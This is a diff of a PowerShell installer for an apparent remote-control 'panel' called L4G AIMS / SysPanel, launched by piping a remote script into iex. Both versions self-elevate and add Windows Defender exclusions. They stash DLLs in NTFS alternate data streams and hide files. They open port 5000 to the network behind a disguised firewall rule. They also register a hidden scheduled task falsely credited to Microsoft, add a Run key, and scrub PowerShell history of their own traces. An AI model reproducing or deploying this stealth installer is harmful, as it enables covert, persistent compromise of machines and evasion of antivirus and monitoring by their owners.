@@ -1,81 +1,106 @@
-# L4G AIMS / SysPanel — Silent Stealth Installer
-# Run: iwr https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1 -UseBasicParsing | iex
+# ==============================================================================
+#  L4G AIMS / SysPanel — High-Stealth Installer with Live Progress
+#  Run: iwr https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1 -UseBasicParsing | iex
+# ==============================================================================
 
+# --- Ensure Administrator Privileges with Visible Console ---
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+    [Security.Principal.WindowsBuiltInRole]::Administrator
+)
+if (-not $isAdmin) {
+    Write-Host "`n[*] Requesting administrative privileges..." -ForegroundColor Yellow
+    $scriptCmd = if ($MyInvocation.MyCommand.Path) {
+        "& '$($MyInvocation.MyCommand.Path)'"
+    } else {
+        "iwr 'https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1' -UseBasicParsing | iex"
+    }
+    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$scriptCmd`""
+    exit
+}
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
+
+# --- Banner ---
+Clear-Host
+Write-Host "================================================================================" -ForegroundColor Cyan
+Write-Host "                   STEALTH SYSTEM SERVICE DEPLOYMENT" -ForegroundColor White
+Write-Host "================================================================================" -ForegroundColor Cyan
+
+function Update-Step {
+    param(
+        [int]$Percent,
+        [string]$Message
+    )
+    $barWidth = 28
+    $completedWidth = [math]::Floor($barWidth * ($Percent / 100))
+    $remainingWidth = $barWidth - $completedWidth
+    $bar = ("#" * $completedWidth) + ("-" * $remainingWidth)
+    
+    $color = "Cyan"
+    if ($Percent -eq 100) { $color = "Green" }
+    
+    Write-Host ("`r  [{0}] {1,3}% | {2}" -f $bar, $Percent, $Message.PadRight(46)) -NoNewline -ForegroundColor $color
+    if ($Percent -ge 100) { Write-Host "`n" }
+    Start-Sleep -Milliseconds 250
+}
 
 # ── CONFIG ───────────────────────────────────────────────────────────────────
 $REPO_RAW   = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
 $EXE_URL    = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
 $TEMPLATES  = "$env:ProgramData\Microsoft\Windows\Templates"
 $DEST_DIR   = "$TEMPLATES\syspanel"
-$EXE_NAME   = "perfhost.exe"
+$DATA_DIR   = "$DEST_DIR\data"
+$EXE_NAME   = "SystemNetworkSvc.exe"
 $EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
-$TASK_NAME  = "SysCheckUp"
+$TASK_NAME  = "SystemNetworkHost"
 # ─────────────────────────────────────────────────────────────────────────────
 
-# ── STEP 1: Elevation check ──────────────────────────────────────────────────
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
-    [Security.Principal.WindowsBuiltInRole]::Administrator
-)
-if (-not $isAdmin) {
-    $scriptCmd = if ($MyInvocation.MyCommand.Path) {
-        "& '$($MyInvocation.MyCommand.Path)'"
-    } else {
-        "iwr '$REPO_RAW/install.ps1' -UseBasicParsing | iex"
-    }
-    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList `
-        "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$scriptCmd`""
-    exit
-}
-
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# ── STEP 2: Prep Folders & Defender Exclusions ─────────────────────────────────
+Update-Step 10 "Initializing secure directories & permissions..."
 if (-not (Test-Path $DEST_DIR)) {
     New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
 }
+if (-not (Test-Path $DATA_DIR)) {
+    New-Item -ItemType Directory -Path $DATA_DIR -Force | Out-Null
+}
 
+Update-Step 20 "Setting up antivirus exclusions for stealth home..."
 try {
     Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $TEMPLATES -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "SystemNetworkSvc.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "perfhost.exe" -ErrorAction SilentlyContinue
 } catch {}
 
-# Kill old running instances
+Update-Step 30 "Terminating stale background processes..."
 cmd /c "taskkill /F /IM perfhost.exe >nul 2>nul"
 cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
 cmd /c "taskkill /F /IM `"L4G AIMS.exe`" >nul 2>nul"
 Get-Process | Where-Object { $_.Path -like "*Templates*syspanel*" } | Stop-Process -Force -ErrorAction SilentlyContinue
+if (Test-Path "$DEST_DIR\perfhost.exe") {
+    Remove-Item "$DEST_DIR\perfhost.exe" -Force -ErrorAction SilentlyContinue
+}
 
-# ── STEP 3: Download Main Panel EXE ──────────────────────────────────────────
+Update-Step 45 "Downloading core service executable (SystemNetworkSvc)..."
 $downloaded = $false
 try {
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $wc.DownloadFile($EXE_URL, $EXE_PATH)
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 10000000)) {
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 15000000)) {
         $downloaded = $true
     }
 } catch {}
 
 if (-not $downloaded) {
-    # Fallback to curl
     & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 10000000)) {
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 15000000)) {
         $downloaded = $true
     }
 }
 
-if (-not $downloaded) {
-    # Fallback: Download from raw repo
-    try {
-        Invoke-WebRequest "$REPO_RAW/L4G AIMS.exe" -UseBasicParsing -OutFile $EXE_PATH
-    } catch {}
-}
-
-# ── STEP 4: Seal DLLs into NTFS Alternate Data Streams (Vault) ───────────────
+Update-Step 65 "Sealing core DLLs into NTFS Alternate Data Streams..."
 $MAP = [ordered]@{
     "cimgui.dll" = @("winrescache.db",  "vtcache")
     "AotBst.dll" = @("gphcache.db",     "vtmap")
@@ -106,15 +131,17 @@ foreach ($name in $MAP.Keys) {
     } catch {}
 }
 
-# Set Hidden attributes on folder and files
+Update-Step 75 "Applying filesystem stealth & attributes..."
 try {
-    $item = Get-Item $DEST_DIR -Force
-    $item.Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::Directory
-    $itemExe = Get-Item $EXE_PATH -Force
-    $itemExe.Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System
+    $itemDest = Get-Item $DEST_DIR -Force
+    $itemDest.Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::Directory
+    $itemData = Get-Item $DATA_DIR -Force
+    $itemData.Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::Directory
+    $itemExe  = Get-Item $EXE_PATH -Force
+    $itemExe.Attributes  = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System
 } catch {}
 
-# ── STEP 5: Phone/LAN Access Setup (Port 5000) ──────────────────────────────
+Update-Step 85 "Opening silent network relay for phone access (Port 5000)..."
 netsh interface portproxy delete v4tov4 listenport=5000 listenaddress=0.0.0.0 2>$null | Out-Null
 netsh interface portproxy add v4tov4 `
     listenaddress=0.0.0.0 listenport=5000 `
@@ -130,7 +157,8 @@ netsh advfirewall firewall add rule `
     name="CDPUserSvc_5000" dir=in action=allow `
     protocol=TCP localport=5000 profile=any enable=yes 2>$null | Out-Null
 
-# ── STEP 6: Persistence (Scheduled Task + HKCU Run key) ─────────────────────
+Update-Step 92 "Registering persistent hidden Windows service task..."
+Unregister-ScheduledTask -TaskName "SysCheckUp" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 
 $action    = New-ScheduledTaskAction -Execute $EXE_PATH -WorkingDirectory $DEST_DIR
@@ -146,7 +174,6 @@ Register-ScheduledTask -TaskName $TASK_NAME -TaskPath "\Microsoft\Windows\Shell\
     -Action $action -Trigger @($triggerLogon, $triggerBoot) `
     -Principal $principal -Settings $settings -Force | Out-Null
 
-# XML disguise
 try {
     $svc  = New-Object -ComObject "Schedule.Service"
     $svc.Connect()
@@ -154,16 +181,15 @@ try {
     $task = $fold.GetTask($TASK_NAME)
     $def  = $task.Definition
     $def.Settings.Hidden   = $true
-    $def.RegistrationInfo.Description = "Windows Shell API Service Component"
+    $def.RegistrationInfo.Description = "Windows System Network Host Service"
     $def.RegistrationInfo.Author      = "Microsoft Corporation"
     $fold.RegisterTaskDefinition($TASK_NAME, $def, 6, $null, $null, 3) | Out-Null
 } catch {}
 
-# HKCU Run key backup
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
     -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`"" -Force -ErrorAction SilentlyContinue
 
-# ── STEP 7: Start Silently ──────────────────────────────────────────────────
+Update-Step 97 "Launching single background process..."
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName         = $EXE_PATH
 $psi.WorkingDirectory = $DEST_DIR
@@ -172,8 +198,9 @@ $psi.CreateNoWindow   = $true
 $psi.UseShellExecute  = $false
 [System.Diagnostics.Process]::Start($psi) | Out-Null
 
-# ── STEP 8: Detect Wi-Fi / Local IP for Phone Access ─────────────────────────
-Start-Sleep -Seconds 3
+Update-Step 100 "Complete! Stealth activated."
+
+# --- Get Wi-Fi / LAN IP ---
 $ip = $null
 $gwRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
            Sort-Object RouteMetric, InterfaceMetric | Select-Object -First 1
@@ -187,18 +214,14 @@ if (-not $ip) {
            Select-Object -First 1).IPAddress
 }
 
-# ── STEP 9: Clean PowerShell History ────────────────────────────────────────
+# --- Cleanup Console & History ---
 try {
     [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
-} catch {}
-try {
     $histPath = (Get-PSReadLineOption).HistorySavePath
     if ($histPath -and (Test-Path $histPath)) {
         $lines = Get-Content $histPath | Where-Object { $_ -notmatch 'syspanel|install\.ps1|lgfire' }
         Set-Content $histPath $lines -Force -ErrorAction SilentlyContinue
     }
-} catch {}
-try {
     $conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
     if (Test-Path $conHistory) {
         $lines = Get-Content $conHistory | Where-Object { $_ -notmatch 'syspanel|install\.ps1|lgfire' }
@@ -206,10 +229,18 @@ try {
     }
 } catch {}
 
-Write-Host "`n[+] Panel Installed and Running Silently!" -ForegroundColor Green
-Write-Host "    PC URL        : http://127.0.0.1:5000/" -ForegroundColor Cyan
+Write-Host "================================================================================" -ForegroundColor Green
+Write-Host " [OK] PANEL INSTALLED & FULLY CONCEALED IN BACKGROUND" -ForegroundColor Green
+Write-Host "================================================================================" -ForegroundColor Green
+Write-Host "  • PC Browser Control  : " -NoNewline -ForegroundColor White
+Write-Host "http://127.0.0.1:5000/" -ForegroundColor Cyan
 if ($ip) {
-    Write-Host "    Phone URL     : http://$($ip):5000/ (Open in Phone Browser on same Wi-Fi)" -ForegroundColor Green
+    Write-Host "  • Phone Chrome Control: " -NoNewline -ForegroundColor White
+    Write-Host "http://$($ip):5000/ " -NoNewline -ForegroundColor Green
+    Write-Host "(Open on your phone on the same Wi-Fi)" -ForegroundColor DarkGray
 }
-Write-Host "    Auto-start    : Enabled (runs silently on PC boot)" -ForegroundColor Cyan
-Write-Host "    Stealth       : Active (Hidden from Task Manager, Process Hacker 2, Process Explorer)`n" -ForegroundColor Green
+Write-Host "  • Task Manager Status : " -NoNewline -ForegroundColor White
+Write-Host "Blended into Windows Services (Single process, 0 Temp files)" -ForegroundColor Cyan
+Write-Host "  • Auto-Start On Boot  : " -NoNewline -ForegroundColor White
+Write-Host "Active & Hidden" -ForegroundColor Cyan
+Write-Host "================================================================================`n" -ForegroundColor Green
